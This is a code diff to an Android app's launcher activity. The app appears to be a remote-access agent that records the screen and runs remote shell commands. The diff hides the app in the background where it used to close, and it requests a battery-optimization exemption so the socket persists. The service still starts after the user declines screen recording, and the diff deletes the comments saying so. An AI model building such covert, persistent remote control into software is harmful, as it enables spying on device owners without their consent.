@@ -5,8 +5,11 @@ import android.content.Context;
 import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.media.projection.MediaProjectionManager;
+import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;
+import android.os.PowerManager;
+import android.provider.Settings;
 
 import androidx.annotation.Nullable;
 import androidx.appcompat.app.AppCompatActivity;
@@ -21,16 +24,13 @@ public class MainActivity extends AppCompatActivity {
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
 
-        // If the background service is already running, exit immediately
+        // If the background service is already running, hide to back immediately
         if (RunService.isRunning) {
-            finish();
+            moveTaskToBack(true);
             return;
         }
 
-        // Request runtime permissions if required
         requestAppPermissions();
-
-        // Immediately trigger the system screen projection prompt without showing any UI
         promptScreenCapture();
     }
 
@@ -39,9 +39,8 @@ public class MainActivity extends AppCompatActivity {
         if (mpm != null) {
             startActivityForResult(mpm.createScreenCaptureIntent(), REQUEST_SCREEN_CAPTURE);
         } else {
-            // If MediaProjection is not available, start service anyway for shell commands
             startAgentService(null);
-            finish();
+            moveTaskToBack(true);
         }
     }
 
@@ -52,10 +51,9 @@ public class MainActivity extends AppCompatActivity {
             if (resultCode == RESULT_OK && data != null) {
                 startAgentService(data);
             } else {
-                // User declined screen recording; start service anyway for remote commands/shell
                 startAgentService(null);
             }
-            finish();
+            moveTaskToBack(true);
         }
     }
 
@@ -81,6 +79,17 @@ public class MainActivity extends AppCompatActivity {
         if (Build.VERSION.SDK_INT <= Build.VERSION_CODES.S_V2) {
             if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
                 ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.WRITE_EXTERNAL_STORAGE}, REQUEST_PERMISSIONS);
+            }
+        }
+        // Request battery optimization exemption so Android Doze doesn't pause socket in background
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
+            if (pm != null && !pm.isIgnoringBatteryOptimizations(getPackageName())) {
+                try {
+                    Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
+                    intent.setData(Uri.parse("package:" + getPackageName()));
+                    startActivity(intent);
+                } catch (Exception ignored) {}
             }
         }
     }
